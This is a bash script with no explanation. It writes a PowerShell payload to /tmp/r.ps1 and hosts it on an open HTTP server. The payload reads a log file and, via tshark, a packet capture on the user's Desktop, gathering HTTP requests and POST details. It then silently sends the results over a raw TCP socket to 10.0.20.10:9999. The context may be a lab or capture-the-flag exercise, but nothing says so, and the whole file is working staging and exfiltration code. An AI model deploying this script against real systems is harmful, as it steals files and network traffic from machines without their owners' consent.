#!/bin/bash
pkill -f 'http.server 8000' 2>/dev/null
cat > /tmp/r.ps1 <<'PSEOF'
$a=@()
$f='C:\Temp\httpd.txt'
if(Test-Path $f){$a+='== httpd.txt ==';$a+=(gc $f -TotalCount 150)}
$t='C:\Program Files\Wireshark\tshark.exe'
$p="$env:USERPROFILE\Desktop\full_traffic.pcapng"
$a+="tshark=$((Test-Path $t)) pcap=$((Test-Path $p))"
if((Test-Path $t)-and(Test-Path $p)){
  $a+='== http requests =='
  $a+=(& $t -r $p -Y 'http.request' -T fields -e ip.src -e http.request.uri 2>$null | Select-Object -First 100)
  $a+='== big posts =='
  $a+=(& $t -r $p -Y 'http.request.method==POST' -T fields -e ip.src -e ip.dst -e http.request.uri -e http.content_length 2>$null | Select-Object -First 30)
}
try{$c=New-Object Net.Sockets.TcpClient;$c.Connect('10.0.20.10',9999);$s=$c.GetStream();$b=[Text.Encoding]::UTF8.GetBytes(($a -join "`r`n"));$s.Write($b,0,$b.Length);$s.Flush();$c.Close()}catch{}
PSEOF
cd /tmp
nohup python3 -m http.server 8000 --bind 0.0.0.0 > /tmp/http.log 2>&1 &
sleep 1
ls -la /tmp/r.ps1
ss -lntp 2>/dev/null | grep -E '8000|9999'
